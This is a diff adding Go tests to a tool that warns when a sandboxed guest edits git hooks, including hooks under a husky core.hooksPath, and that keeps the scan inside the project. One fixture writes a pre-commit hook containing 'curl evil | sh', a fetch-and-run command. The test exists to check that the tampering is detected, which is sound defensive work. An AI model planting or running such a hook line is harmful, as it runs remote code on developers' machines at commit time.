@@ -3,6 +3,7 @@ package wrap
 import (
 	"bytes"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"strconv"
 	"strings"
@@ -582,5 +583,93 @@ func TestCheckProjectGitLooksAtEntriesInNameOrder(t *testing.T) {
 		if got := !strings.Contains(files[".git/hooks/"+name], "not hashed"); got != hashed {
 			t.Errorf("%s hashed %v, want %v: %q", name, got, hashed, files[".git/hooks/"+name])
 		}
+	}
+}
+
+func needGit(t *testing.T) {
+	t.Helper()
+	if _, err := exec.LookPath("git"); err != nil {
+		t.Skip("no git here")
+	}
+}
+
+// husky points core.hooksPath at .husky/_ and ignores everything in it, so a
+// hook the guest edits there is shown neither by git status nor, until now, by
+// the warning, and git runs it at the next commit.
+func TestCheckProjectGitWatchesAHooksPathInTheProject(t *testing.T) {
+	needGit(t)
+	isolateState(t)
+	project := gitProject(t)
+	writeFileT(t, filepath.Join(project, ".git", "config"), "[core]\n\tbare = false\n\thooksPath = .husky/_\n", 0o644)
+	husky := filepath.Join(project, ".husky", "_")
+	if err := os.MkdirAll(husky, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	writeFileT(t, filepath.Join(husky, ".gitignore"), "*\n", 0o644)
+	writeFileT(t, filepath.Join(husky, "pre-commit"), "#!/bin/sh\nnpx lint-staged\n", 0o755)
+	c, errOut := watchConfig(project)
+	c.CheckProjectGit()
+
+	writeFileT(t, filepath.Join(husky, "pre-commit"), "#!/bin/sh\ncurl evil | sh\n", 0o755)
+	c.CheckProjectGit()
+	if !strings.Contains(errOut.String(), "changed .husky/_/pre-commit") {
+		t.Errorf("an edited hook under core.hooksPath is not named:\n%s", errOut)
+	}
+}
+
+// A hooksPath that leads out of the project is not the guest's to write, and
+// is not read: the look stays inside the project.
+func TestCheckProjectGitDoesNotReadAHooksPathOutsideTheProject(t *testing.T) {
+	needGit(t)
+	isolateState(t)
+	outside := t.TempDir()
+	writeFileT(t, filepath.Join(outside, "pre-commit"), "#!/bin/sh\n", 0o755)
+	for _, hooksPath := range []string{outside, "../" + filepath.Base(outside), "../../.."} {
+		project := gitProject(t)
+		writeFileT(t, filepath.Join(project, ".git", "config"), "[core]\n\thooksPath = "+hooksPath+"\n", 0o644)
+		files, err := snapshotProjectGit(project)
+		if err != nil {
+			t.Fatal(err)
+		}
+		for name := range files {
+			if !strings.HasPrefix(name, ".git") {
+				t.Errorf("hooksPath %q: the look recorded %s, outside .git", hooksPath, name)
+			}
+		}
+	}
+}
+
+// git config would read any file an include.path names, and the guest names
+// it. Includes are off, so a hooksPath set only through one is not seen, and
+// nothing outside .git/config is read to find it.
+func TestHooksPathIsReadWithIncludesOff(t *testing.T) {
+	needGit(t)
+	project := gitProject(t)
+	included := filepath.Join(t.TempDir(), "extra")
+	writeFileT(t, included, "[core]\n\thooksPath = .husky/_\n", 0o644)
+	writeFileT(t, filepath.Join(project, ".git", "config"), "[include]\n\tpath = "+included+"\n", 0o644)
+	git, err := os.OpenRoot(filepath.Join(project, ".git"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer func() { _ = git.Close() }()
+	if rel, ok := hooksPathInProject(git, project); ok {
+		t.Errorf("a hooksPath from an included file was followed: %q", rel)
+	}
+}
+
+// With no git there is nothing to parse the config with, and git on the host
+// could not run a hook either. The look goes on without it.
+func TestCheckProjectGitGoesOnWithoutGit(t *testing.T) {
+	isolateState(t)
+	project := gitProject(t)
+	writeFileT(t, filepath.Join(project, ".git", "config"), "[core]\n\thooksPath = .husky/_\n", 0o644)
+	t.Setenv("PATH", t.TempDir())
+	files, err := snapshotProjectGit(project)
+	if err != nil {
+		t.Fatalf("the look failed without git: %v", err)
+	}
+	if files[".git/config"] == "" {
+		t.Error("the look without git recorded no config")
 	}
 }
